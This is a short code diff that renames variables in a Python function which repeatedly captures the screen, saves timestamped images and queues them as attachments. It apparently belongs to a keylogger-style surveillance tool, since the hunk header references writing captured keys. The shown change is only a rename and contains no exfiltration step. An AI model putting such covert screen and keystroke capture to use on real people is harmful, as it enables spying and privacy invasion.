@@ -74,10 +74,10 @@ def write_file(keys):
 def take_screenshot():
     while screenshot_enabled:
         try:
-            ekran_goruntusu = ImageGrab.grab()
-            zaman_etiketi = time.strftime("%Y%m%d%H%M%S")
-            file_name = f'{record_file}ekran_{zaman_etiketi}.png'
-            ekran_goruntusu.save(file_name)
+            screenshot = ImageGrab.grab()
+            time_label = time.strftime("%Y%m%d%H%M%S")
+            file_name = f'{record_file}ekran_{time_label}.png'
+            screenshot.save(file_name)
             attachments.append(file_name)  
             print(f'Ekran görüntüsü kaydedildi: {file_name}')
             time.sleep(time_ss)
